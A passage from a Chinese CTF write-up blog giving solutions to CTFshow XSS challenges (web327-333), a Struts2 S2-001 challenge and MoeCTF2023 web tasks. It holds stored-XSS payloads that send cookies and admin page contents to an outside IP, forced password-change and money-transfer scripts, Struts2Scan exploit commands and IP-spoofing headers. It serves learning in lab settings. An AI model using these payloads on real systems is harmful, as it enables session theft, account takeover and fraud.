punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>String2ascii.py</p><pre class="language-python" data-language="python"><code class="language-python">input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入字符串: "</span><span class="token punctuation">)</span>  <span class="token comment"># 获取用户输入的字符串</span>ascii_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span><span class="token keyword">for</span> char <span class="token keyword">in</span> input_str<span class="token punctuation">:</span>    ascii_code <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>  <span class="token comment"># 使用ord()函数获取字符的ASCII码</span>    ascii_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ascii_code<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将ASCII码转换为字符串并添加到列表</span><span class="token comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span>result <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ascii_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"转换后的ASCII码:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span></code></pre><p>Ascii2string.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ascii_to_string</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span>    ascii_list <span class="token operator">=</span> ascii_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> code <span class="token keyword">in</span> ascii_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># 输入以逗号分隔的ASCII码字符串</span>ascii_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入以逗号分隔的ASCII码字符串: "</span><span class="token punctuation">)</span><span class="token comment"># 调用函数进行转换并打印结果</span>string_result <span class="token operator">=</span> ascii_to_string<span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"转换后的字符串:"</span><span class="token punctuation">,</span> string_result<span class="token punctuation">)</span></code></pre><h4 id="web327-存储型xss"><a href="#web327-存储型xss" class="headerlink" title="web327(存储型xss)"></a>web327(存储型xss)</h4><p>虽然但是，还是之前的payload，收件人必须是admin</p><h4 id="web328-伪造Cookie"><a href="#web328-伪造Cookie" class="headerlink" title="web328(伪造Cookie)"></a>web328(伪造Cookie)</h4><p>先提前监听5010端口，然后在注册用户的时候注入payload，反弹管理员的cookie</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>这样得到admin的cookie进行伪造查看用户即可得到flag</p><h4 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h4><p>和上题不同的是，Cookie会立刻失效。不能通过窃取Cookie的形式得到flag了。</p><p>我们分析一下原理，我们的payload作为储存型XSS，管理员访问时候能被我们窃取Cookie，那是不是还能窃取点别的东西呢，比如说管理员看到的用户名和密码。理论上来说是可以的，所以就直接获取管理员的页面信息。</p><p>我们可以通过类名查找元素，通过document来获取。</p><p>现在服务器上面监听端口5010。</p><p>innerHTML和outerHTML的区别</p><blockquote><p>1、innerHTML:<br>　　从对象的起始位置到终止位置的全部内容,不包括Html标签。<br>innerText可替代innerHTML</p><p>2、outerHTML:<br>　　除了包含innerHTML的全部内容外, 还包含对象标签本身。</p></blockquote><p><img src="web329.png" alt="img" loading="lazy"></p><p>可以看到前端代码中将要显示admin密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p><p>payload： </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'layui-table-cell laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>解释一下它的每一部分：</p><blockquote><p><code>window.open(&#39;http://117.72.70.186:5010/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)</code>这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。<br><code>&#39;http://117.72.70.186:5010/&#39;</code> 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:&#x2F;&#x2F;）、主机名（120.46.41.173）和端口号（9023），以及路径（后面的斜杠 &#x2F;）。<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML</code> 这是一系列 DOM 操作，用于获取网页中特定元素的内容。<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)</code> 是一个通过类名查找元素的方法。它查找具有类名 <code>&#39;layui-table-cell&#39;</code> 和 <code>&#39;laytable-cell-1-0-1&#39;</code> 的元素，通常这是一种针对表格单元格的选择。<br><code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。<br><code>.innerHTML</code> 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。</p></blockquote><p><img src="web329_2.png" loading="lazy"></p><h4 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h4><p>多了一个修改密码，可以看到调用了<code>api/change.php</code>参数p则是我们修改的密码</p><p><img src="web330.png" loading="lazy"></p><p>我们可以伪造admin的cookie来去修改密码，但cookie是暂时的，所以利用xss主动去改</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=111'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>然后登录admin就可以了</p><h4 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h4><p>和上题类似，我们先抓包分析。这次修改密码变成了POST请求。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"api/change.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'p'</span><span class="token operator">:</span><span class="token string">'111'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h4><p>这次多了可以转账的功能</p><p>说是可以向别人转负数，但是我这儿就是有内鬼，停止交易😅</p><p>所以利用xss</p><blockquote><p>jquery的这个ajax不能携带cookie请求，所以有点麻烦，但是如果是本地请求就刚好绕过了这一点</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1/api/amount.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'u'</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string-property property">'a'</span><span class="token operator">:</span><span class="token number">10000</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xs5/post.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>在注册界面填入payload</p><p>然后找个test账号收钱</p><h4 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h4><p>332的方法照样可以</p><p>也可以转账给自己，而且得保证自己最低有1块钱，写个脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> timex<span class="token operator">=</span><span class="token number">5</span>url<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/amount.php"</span>url2<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/getFlag.php"</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID=3o54ih5njfm1hh1ccnet28e59b'</span><span class="token punctuation">&#125;</span>  <span class="token comment">#自己登录后的sessionid</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    t<span class="token operator">=</span>x<span class="token operator">-</span><span class="token number">1</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'u'</span><span class="token punctuation">:</span><span class="token string">'hsad'</span><span class="token punctuation">,</span> <span class="token comment">#注册的用户名</span>    <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">></span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r2<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    x<span class="token operator">+=</span>t</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-Java</title>
      <link href="/2024/07/18/web%E5%85%A5%E9%97%A8-Java/"/>
      <url>/2024/07/18/web%E5%85%A5%E9%97%A8-Java/</url>
      
        <content type="html"><![CDATA[<h3 id="web279-300"><a href="#web279-300" class="headerlink" title="web279-300"></a>web279-300</h3><p><a href="https://www.secrss.com/articles/24780">史上最全Struts 2漏洞复现过程及PoC合集</a></p><h4 id="web279-struts2漏洞-S2-001"><a href="#web279-struts2漏洞-S2-001" class="headerlink" title="web279(struts2漏洞 S2-001)"></a>web279(struts2漏洞 S2-001)</h4><p><a href="https://www.freebuf.com/column/224041.html">Vulhub漏洞系列：struts2漏洞 S2-001</a></p><p>刚开始只学了基础的Java类，Poc中的一些构造方法还未接触，所以刚开始用了<a href="https://github.com/wyzmgmdg/Struts2Scan">Struts2Scan</a>通杀脚本</p><p>检测：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://08c8e9cf-4a7b-458f-b75b-2f2bdeae6c1b.chall.ctf.show:8080/S2-001/login.action</code></pre><p>利用：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://22350c9d-7de9-4d0c-9e56-b26cd771f1dd.challenge.ctf.show/S2-001/login.action <span class="token parameter variable">-n</span> S2-001 <span class="token parameter variable">--exec</span></code></pre><p>执行命令env即可得到flag</p><p><strong>这集贸太难了，先缓缓</strong></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2023-web</title>
      <link href="/2024/07/14/MoeCTF2023-web/"/>
      <url>/2024/07/14/MoeCTF2023-web/</url>
      
        <content type="html"><![CDATA[<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><pre class="language-php" data-language="php"><code class="language-php">this is <span class="token constant">GET</span> method<span class="token punctuation">,</span>         your mission<span class="token punctuation">:</span>        <span class="token number">1.</span><span class="token keyword">use</span> <span class="token package">parameter</span><span class="token punctuation">:</span> UwU<span class="token operator">=</span>u        <span class="token number">2.</span>post <span class="token operator">**</span>form<span class="token operator">**</span><span class="token punctuation">:</span> Luv<span class="token operator">=</span>u        <span class="token number">3.</span><span class="token keyword">use</span> <span class="token package">admin</span> character        <span class="token number">4.</span>request from <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>        <span class="token number">5.</span><span class="token keyword">use</span> <span class="token package">browser</span> <span class="token string single-quoted-string">'MoeBrowser'</span>        Complete All Missions</code></pre><p>考察基础的http协议</p><p><img src="easy.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">NewStarCTF2023</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">newstarctf.com</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">power=ctfer</span></span><span class="token header"><span class="token header-name keyword">X-Real-Ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-Ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>secret=n3wst4rCTF2023g00000d伪造IP<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Client-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Rriginating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-addr</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">HTTP_CLIENT_IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Real-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Originating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">via</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1  代理</span></span></code></pre><h4 id="web入门指北"><a href="#web入门指北" class="headerlink" title="web入门指北"></a>web入门指北</h4><p>文末有一串密文</p><p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d</p><p>这是一串16进制编码，解码得到</p><p>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p><p>flag的内容解码得到</p><p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p><h4 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h4><p>F12源码中被撤回的消息那里有flag</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>附件中有一些api说明</p><p>注册 <code>POST /register</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>登录 <code>POST /login</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>获取flag <code>GET /flag</code></p><p>查询服务状态 &#96;GET &#x2F;status</p><p>按照流程注册并登陆后，返回了Cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">token=eyJ1c2VybmFtZSI6ICJoc2FkIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ==;</span></span>base64decode：&#123;"username": "hsad", "password": "123456", "role": "user"&#125;</code></pre><p>将<code>role</code>改为admin并作为Cookie访问&#x2F;flag得到flag</p><h4 id="gas-gas-gas-Spider"><a href="#gas-gas-gas-Spider" class="headerlink" title="gas!gas!gas!(Spider)"></a>gas!gas!gas!(Spider)</h4><p>如何漂移</p><ol><li>油门大轮胎转速高空转，抓地力就小，反之抓地力大</li><li>保持反打，根据弯方向提示，反打反向</li><li>在0.5s内快速反应，并坚持下来五轮</li><li>重新随便提交一次操作来重新开始</li></ol><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;   &lt;label for&#x3D;&quot;driver&quot;&gt;选手:&lt;&#x2F;label&gt;   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;      &lt;label for&#x3D;&quot;steering_control&quot;&gt;方向控制:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;     &lt;option value&#x3D;&quot;-1&quot;&gt;左&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;0&quot; selected&gt;直行&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;右&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;   &lt;label for&#x3D;&quot;throttle&quot;&gt;油门控制:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;     &lt;option value&#x3D;&quot;0&quot;&gt;松开&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;保持&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;2&quot; selected&gt;全开&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;form&gt;</code></pre><p>根据返回的提示来改变每次赛车的操作，不过有时间限制，所以要编写脚本完成</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://localhost:3906/'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token string">"driver=hsad&amp;steering_control=0&amp;throttle=0&#125;"</span>post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token operator">=</span>url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>post_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>steering_control <span class="token operator">=</span> <span class="token number">0</span>throttle <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'弯道向左'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'弯道向右'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'弯道直行'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'保持这个速度'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'抓地力太大了'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token string">'抓地力太小了'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">0</span>    steering_control_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'-1'</span><span class="token punctuation">:</span> <span class="token string">'左'</span><span class="token punctuation">,</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'直行'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'右'</span>    <span class="token punctuation">&#125;</span>    throttle_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'松开'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'保持'</span><span class="token punctuation">,</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'全开'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>steering_control<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>throttle<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token operator">=</span>url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=hsad&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        headers<span class="token operator">=</span>headers    <span class="token 